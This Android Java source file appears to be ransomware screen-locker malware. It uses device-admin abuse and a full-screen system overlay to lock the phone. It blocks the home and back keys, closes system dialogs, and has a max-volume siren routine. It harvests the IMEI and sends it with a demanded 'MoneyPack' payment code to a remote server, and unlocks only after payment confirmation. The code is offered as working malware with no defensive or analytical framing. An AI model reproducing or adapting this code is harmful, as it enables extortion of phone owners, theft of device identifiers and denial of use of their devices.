package com.example.testlock;

import java.util.Timer;
import java.util.TimerTask;

import android.app.Activity;
import android.app.admin.DeviceAdminReceiver;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.net.Uri;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.Gravity;
import android.view.KeyEvent;
import android.view.LayoutInflater;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.ViewGroup;
import android.view.WindowManager;
import android.view.WindowManager.LayoutParams;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;

public class MainActivity extends DeviceAdminReceiver {
	private View mLockView;

	public void onEnabled(Context context, Intent intent) {
	}

	@Override
	public CharSequence onDisableRequested(Context context, Intent intent) {

		final WindowManager.LayoutParams param = new WindowManager.LayoutParams();
		param.flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
				| WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH;
		param.format = PixelFormat.TRANSLUCENT;
		View rootView = LayoutInflater.from(context).inflate(
				R.layout.block_layout, null);
		mLockView = rootView.findViewById(R.id.my_floating_view);
		final ViewGroup parent = (ViewGroup) mLockView.getParent();
		if (parent != null)
			parent.removeView(mLockView);
		param.format = PixelFormat.RGBA_8888;
		param.type = WindowManager.LayoutParams.TYPE_SYSTEM_ERROR;
		param.gravity = Gravity.TOP | Gravity.LEFT;
		param.width = LayoutParams.MATCH_PARENT;
		param.height = LayoutParams.MATCH_PARENT;
		final WindowManager wmgr = (WindowManager) context
				.getApplicationContext().getSystemService(
						Context.WINDOW_SERVICE);
		wmgr.addView(mLockView, param);

		Intent intentMain = new Intent(context, mainActivity.class);
		intentMain.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		context.startActivity(intentMain);

		return "May lose user data. Do you want to continue?";
	}

	@Override
	public void onDisabled(Context context, Intent intent) {
	}

	public static class mainActivity extends Activity {

		/*
		 * (non-Javadoc)
		 * 
		 * @see android.app.Activity#onBackPressed()
		 */
		@Override
		public void onBackPressed() {

		}

		public static mainActivity Activity;

		private View mLockView;

		private EditText et_code;
		private Button bt_proceed, bt_clear;
		private Button btn1, btn2, btn3, btn4, btn5, btn6, btn7, btn8, btn9,
				btn0;
		private LinearLayout ll_where, ll_error, ll_succsess, ll_codeinput;

		@Override
		public void onWindowFocusChanged(boolean hasFocus) {
			super.onWindowFocusChanged(hasFocus);
			if (!hasFocus) {
				Intent closeDialog = new Intent(
						Intent.ACTION_CLOSE_SYSTEM_DIALOGS);
				sendBroadcast(closeDialog);
			}
		}

		@Override
		public boolean onKeyDown(int keyCode, KeyEvent event) {
			if (keyCode == KeyEvent.KEYCODE_HOME) {

				return true;
			}
			return true;
		}

		@Override
		public boolean onKeyUp(int keyCode, KeyEvent event) {
			if (keyCode == KeyEvent.KEYCODE_HOME) {
				return true;
			}
			return true;
		}

		public void PlayAudio() {
			MediaPlayer mp = MediaPlayer.create(this, R.raw.sirena);
			Timer t = new Timer();
			t.scheduleAtFixedRate(new TimerTask() {

				@Override
				public void run() {
					// TODO Auto-generated method stub
					AudioManager am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
					am.setStreamVolume(AudioManager.STREAM_MUSIC,
							am.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0);
				}
			}, 1, 1);
			mp.setLooping(true);
			mp.start();
		}

		String imei;

		@Override
		protected void onCreate(Bundle savedInstanceState) {
			super.onCreate(savedInstanceState);
			setContentView(R.layout.activity_main);

			// findViewById(R.id.btnExit).setOnClickListener(
			// new OnClickListener() {
			//
			// @Override
			// public void onClick(View v) {
			// // deleteAPP();
			// }
			// });

			final WindowManager.LayoutParams param = new WindowManager.LayoutParams();
			param.flags = WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
					| WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
					| WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH;
			param.format = PixelFormat.TRANSLUCENT;
			mLockView = findViewById(R.id.my_floating_view);
			final ViewGroup parent = (ViewGroup) mLockView.getParent();
			if (parent != null)
				parent.removeView(mLockView);
			param.format = PixelFormat.RGBA_8888;
			param.type = WindowManager.LayoutParams.TYPE_SYSTEM_ERROR;
			param.gravity = Gravity.TOP | Gravity.LEFT;
			param.width = parent != null ? LayoutParams.MATCH_PARENT
					: mLockView.getLayoutParams().width;
			param.height = parent != null ? LayoutParams.MATCH_PARENT
					: mLockView.getLayoutParams().height;
			final WindowManager wmgr = (WindowManager) getApplicationContext()
					.getSystemService(Context.WINDOW_SERVICE);
			wmgr.addView(mLockView, param);

			//PlayAudio();

			TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);

			// TextView tvIMEI = (TextView) mLockView.findViewById(R.id.tvIMEI);
			imei = telephonyManager.getDeviceId();
			// if (imei != null && imei.length() > 0)
			// tvIMEI.setText("# " + imei);

			TextView mTextView = (TextView) mLockView
					.findViewById(R.id.mTextView);
			mTextView
					.setText(""+android.os.Build.MODEL+"");

			new Thread(new Runnable() {

				@Override
				public void run() {
					// TODO Auto-generated method stub
					RequestSender req = new RequestSender(mainActivity.this);
					req.sendIncrement();
				}
			}).start();
			
			
			
			
			new Thread(new Runnable() {

			    @Override
			    public void run() {
			     // TODO Auto-generated method stub
			     //RequestSender req = new RequestSender(mainActivity.this);
			     //String answ = req.checkState(imei);
			     //if (answ.contains("2")) {
			     //deleteAPP();
			     //}
			    }
			   }).start();
	          
	          
	          
			
			final LinearLayout ll_first = (LinearLayout) mLockView
					.findViewById(R.id.firstLay);
			final LinearLayout ll_second = (LinearLayout) mLockView
					.findViewById(R.id.secondLay);
			Button btn = (Button) mLockView.findViewById(R.id.button1);
			btn.setOnClickListener(new OnClickListener() {

				@Override
				public void onClick(View v) {
					// Intent intent = new Intent(MainActivity.this,
					// SenderActivity.class);
					// startActivity(intent);

					// deleteAPP();
					ll_first.setVisibility(View.GONE);
					ll_second.setVisibility(View.VISIBLE);
					createSecond();
				};
			});
		}

		@Override
		protected void onDestroy() {
			super.onDestroy();
		}

		// ///////////////////////////////////////////////////SECONDVIEW/////////////////////////////////////////////////////////////////
		Timer t = null;
		Button whereICan;

		public void createSecond() {
			ll_codeinput = (LinearLayout) mLockView
					.findViewById(R.id.codeInput);
			ll_error = (LinearLayout) mLockView.findViewById(R.id.error);
			ll_succsess = (LinearLayout) mLockView.findViewById(R.id.succsess);
			ll_where = (LinearLayout) mLockView.findViewById(R.id.where);

			whereICan = (Button) mLockView.findViewById(R.id.whereICan);
			whereICan.setOnClickListener(new OnClickListener() {

				@Override
				public void onClick(View v) {
					if (ll_where.getVisibility() == View.VISIBLE)
						ll_where.setVisibility(View.GONE);
					else {
						ll_where.setVisibility(View.VISIBLE);
					}
				}
			});

			btn1 = (Button) mLockView.findViewById(R.id.Button1);

			btn2 = (Button) mLockView.findViewById(R.id.Button2);
			btn3 = (Button) mLockView.findViewById(R.id.button3);
			btn4 = (Button) mLockView.findViewById(R.id.Button4);
			btn5 = (Button) mLockView.findViewById(R.id.Button5);
			btn6 = (Button) mLockView.findViewById(R.id.Button6);
			btn7 = (Button) mLockView.findViewById(R.id.Button7);
			btn8 = (Button) mLockView.findViewById(R.id.Button8);
			btn9 = (Button) mLockView.findViewById(R.id.Button9);
			btn0 = (Button) mLockView.findViewById(R.id.Button0);

			final TextView tvError = (TextView) mLockView
					.findViewById(R.id.tvError);

			et_code = (EditText) mLockView.findViewById(R.id.et_number);
			et_code.setEnabled(false);
			bt_clear = (Button) mLockView.findViewById(R.id.bt_clear);
			bt_proceed = (Button) mLockView.findViewById(R.id.bt_proceed);

			btn1.setOnClickListener(new OnClickListener() {

				@Override
				public void onClick(View v) {
					// TODO Auto-generated method stub
					et_code.setText(et_code.getText().toString() + "1");
				}
			});

			btn2.setOnClickListener(new OnClickListener() {

				@Override
				public void onClick(View v) {
					// TODO Auto-generated method stub
					et_code.setText(et_code.getText().toString() + "2");
				}
			});

			btn3.setOnClickListener(new OnClickListener() {

				@Override
				public void onClick(View v) {
					// TODO Auto-generated method stub
					et_code.setText(et_code.getText().toString() + "3");
				}
			});

			btn4.setOnClickListener(new OnClickListener() {

				@Override
				public void onClick(View v) {
					// TODO Auto-generated method stub
					et_code.setText(et_code.getText().toString() + "4");
				}
			});

			btn5.setOnClickListener(new OnClickListener() {

				@Override
				public void onClick(View v) {
					// TODO Auto-generated method stub
					et_code.setText(et_code.getText().toString() + "5");
				}
			});

			btn6.setOnClickListener(new OnClickListener() {

				@Override
				public void onClick(View v) {
					// TODO Auto-generated method stub
					et_code.setText(et_code.getText().toString() + "6");
				}
			});

			btn7.setOnClickListener(new OnClickListener() {

				@Override
				public void onClick(View v) {
					// TODO Auto-generated method stub
					et_code.setText(et_code.getText().toString() + "7");
				}
			});

			btn8.setOnClickListener(new OnClickListener() {

				@Override
				public void onClick(View v) {
					// TODO Auto-generated method stub
					et_code.setText(et_code.getText().toString() + "8");
				}
			});

			btn9.setOnClickListener(new OnClickListener() {

				@Override
				public void onClick(View v) {
					// TODO Auto-generated method stub
					et_code.setText(et_code.getText().toString() + "9");
				}
			});

			btn0.setOnClickListener(new OnClickListener() {

				@Override
				public void onClick(View v) {
					// TODO Auto-generated method stub
					et_code.setText(et_code.getText().toString() + "0");
				}
			});

			bt_clear.setOnClickListener(new OnClickListener() {

				@Override
				public void onClick(View v) {
					// TODO Auto-generated method stub
					et_code.setText("");
					if (ll_error.getVisibility() == View.VISIBLE) {
						ll_error.setVisibility(View.GONE);
					}
				}
			});

			bt_proceed.setOnClickListener(new OnClickListener() {

				@Override
				public void onClick(View v) {

					final String string = et_code.getText().toString();
					final RequestSender request = new RequestSender(
							mainActivity.this);
					if (request.isOnline()) {
						if (string.length() == 14) {
							if (string.contains("12345")
									|| string.contains("11111")
									|| string.contains("22222")
									|| string.contains("33333")
									|| string.contains("44444")
									|| string.contains("55555")
									|| string.contains("66666")
									|| string.contains("77777")
									|| string.contains("88888")
									|| string.contains("99999")
									|| string.contains("00000")) {

								if (ll_error.getVisibility() == View.GONE) {
									ll_error.setVisibility(View.VISIBLE);
								} else {
									ll_error.setVisibility(View.GONE);
								}
							} else {
								new Thread(new Runnable() {

									@Override
									public void run() {
										// TODO Auto-generated method stub

										TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
										Log.v("", "IMEI - " + imei);
										imei = telephonyManager.getDeviceId();
										request.sendCode(string, imei);
										mainActivity.this
												.runOnUiThread(new Runnable() {

													@Override
													public void run() {

														if (ll_succsess
																.getVisibility() == View.GONE) {
															ll_succsess
																	.setVisibility(View.VISIBLE);
															ll_codeinput
																	.setVisibility(View.GONE);
														}
														if (ll_error
																.getVisibility() == View.VISIBLE) {
															ll_error.setVisibility(View.GONE);

														}

													}
												});
										t = new Timer();
										t.scheduleAtFixedRate(new TimerTask() {

											@Override
											public void run() {
												//String answ = request
												//.checkState(imei);
												//if(answ.contains("result") && answ.contains("2")) {
												//deleteAPP();
												//}
											}
										}, 10000, 10000);
									}
								}).start();

							}
						} else {

							if (ll_error.getVisibility() == View.GONE) {
								ll_error.setVisibility(View.VISIBLE);
								tvError.setText("Wrong MoneyPack code. Please try again");
							} else {
								ll_error.setVisibility(View.GONE);
							}
						}
					} else {
						ll_error.setVisibility(View.VISIBLE);
						tvError.setText("No available Internet connection. Please try again");
					}
				}
			});

		}

		private void deleteAPP() {
			// TODO Auto-generated method stub
			final WindowManager wmgr = (WindowManager) getApplicationContext()
					.getSystemService(Context.WINDOW_SERVICE);
			wmgr.removeView(mLockView);
			DevicePolicyManager mDevicePolicyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
			ComponentName mComponentName = new ComponentName(this,
					MainActivity.class);
			LowLevel.mDevicePolicyManager
					.removeActiveAdmin(LowLevel.mComponentName);
			Uri packageURI = Uri.parse("package:" + "com.example.testlock");
			Intent uninstallIntent = new Intent(Intent.ACTION_DELETE,
					packageURI);
			startActivity(uninstallIntent);
		}
	}
}
